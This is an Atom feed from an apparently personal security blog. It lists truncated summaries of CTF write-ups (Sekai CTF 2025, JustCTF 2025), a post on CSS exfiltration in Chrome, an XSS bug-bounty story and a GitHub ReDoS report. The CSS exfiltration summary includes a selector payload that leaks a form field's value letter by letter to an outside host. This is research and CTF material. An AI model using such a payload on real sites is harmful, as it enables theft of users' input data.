

<feed xmlns="http://www.w3.org/2005/Atom">
  <id>http://localhost:4000/</id>
  <title>Web2.0</title>
  <subtitle>A minimal, responsive and feature-rich Jekyll theme for technical writing.</subtitle>
  <updated>2025-08-19T17:22:34+09:00</updated>
  <author>
    <name>anonymous</name>
    <uri>http://localhost:4000/</uri>
  </author>
  <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml"/>
  <link rel="alternate" type="text/html" hreflang="en"
    href="http://localhost:4000/"/>
  <generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator>
  <rights> © 2025 anonymous </rights>
  <icon>/assets/img/favicons/favicon.ico</icon>
  <logo>/assets/img/favicons/favicon-96x96.png</logo>


  
  <entry>
    <title>Sekai 2025 Sekai Bank - Signature, Transaction</title>
    <link href="http://localhost:4000/posts/Sekai-CTF-2025/" rel="alternate" type="text/html" title="Sekai 2025 Sekai Bank - Signature, Transaction" />
    <published>2025-08-16T09:00:00+09:00</published>
  
    <updated>2025-08-16T09:00:00+09:00</updated>
  
    <id>http://localhost:4000/posts/Sekai-CTF-2025/</id>
    <content src="http://localhost:4000/posts/Sekai-CTF-2025/" />
    <author>
      <name>anonymous</name>
    </author>

  
    
  

  
    <summary>
      





      Signature
SSL Pinning



before solving this challenge, we have to bypass SSL Pinning, i have bypass via objection

Analysis
        &amp;lt;activity
            android:theme="@style/Theme.SekaiBank.NoActionBar"
            android:name="com.sekai.bank.MainActivity"
            android:exported="true"
            android:windowSoftInputMode="adjustPan"
            android:preferMinimalPostProcessi...
    </summary>
  

  </entry>

  
  <entry>
    <title>JustCTF 2025 Positive Players Write Up</title>
    <link href="http://localhost:4000/posts/Just-CTF-2025/" rel="alternate" type="text/html" title="JustCTF 2025 Positive Players Write Up" />
    <published>2025-08-03T09:00:00+09:00</published>
  
    <updated>2025-08-03T09:00:00+09:00</updated>
  
    <id>http://localhost:4000/posts/Just-CTF-2025/</id>
    <content src="http://localhost:4000/posts/Just-CTF-2025/" />
    <author>
      <name>anonymous</name>
    </author>

  
    
  

  
    <summary>
      





      i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach to solve the chall but Positive Players was easy challs like we breath cuz i have solved a lot of challs ab Prototype Pollution

app.get('/flag', isAuthenticated, (req, res, next)=&amp;gt;{
  if(users[re...
    </summary>
  

  </entry>

  
  <entry>
    <title>CSS Exfiltration via attr() + image-set() from Chrome 133</title>
    <link href="http://localhost:4000/posts/css-exfiltration/" rel="alternate" type="text/html" title="CSS Exfiltration via attr() + image-set() from Chrome 133" />
    <published>2025-04-15T09:00:00+09:00</published>
  
    <updated>2025-04-15T09:00:00+09:00</updated>
  
    <id>http://localhost:4000/posts/css-exfiltration/</id>
    <content src="http://localhost:4000/posts/css-exfiltration/" />
    <author>
      <name>anonymous</name>
    </author>

  
    
  

  
    <summary>
      





      Summary

input[name=flag][value^=a]{
    background: url('https://evm.pics/a');
}
input[name=flag][value^=b]{
    background: url('https://evm.pics/b');
}
/* ... */

In most cases, when exploiting CSS exfiltration, they should have attempted to leak data using a payload like the one shown above. However, the process is often tedious, as each word must be leaked step by step but recently they ca...
    </summary>
  

  </entry>

  
  <entry>
    <title>($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</title>
    <link href="http://localhost:4000/posts/XSS-in-ML-Framework/" rel="alternate" type="text/html" title="($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?" />
    <published>2023-09-14T11:00:53+09:00</published>
  
    <updated>2023-09-14T11:00:53+09:00</updated>
  
    <id>http://localhost:4000/posts/XSS-in-ML-Framework/</id>
    <content src="http://localhost:4000/posts/XSS-in-ML-Framework/" />
    <author>
      <name>anonymous</name>
    </author>

  
    
  

  
    <summary>
      





      Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to escalate it low-severity to high-severity. first of all, the bug i found was xss. i know that most people think that is not the bug which has high severity but me and others know a way to exploit sce...
    </summary>
  

  </entry>

  
  <entry>
    <title>0-Day, Copy and Paste ReDoS in github.com</title>
    <link href="http://localhost:4000/posts/ReDos-in-Github/" rel="alternate" type="text/html" title="0-Day, Copy and Paste ReDoS in github.com" />
    <published>2023-08-05T18:00:53+09:00</published>
  
    <updated>2023-08-05T18:00:53+09:00</updated>
  
    <id>http://localhost:4000/posts/ReDos-in-Github/</id>
    <content src="http://localhost:4000/posts/ReDos-in-Github/" />
    <author>
      <name>anonymous</name>
    </author>

  
    
  

  
    <summary>
      





      Summary
In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.


Analysis

function onPaste$1(event) {
    const { currentTarget: el } = event;
    if (shouldSkipFormatting(el))
        return;
    if (!event.clipboardData)
        return;
    const textToPaste = generateText(event.clipboardData);
    if (!textToPaste)
        return;
   ...
    </summary>
  

  </entry>

</feed>


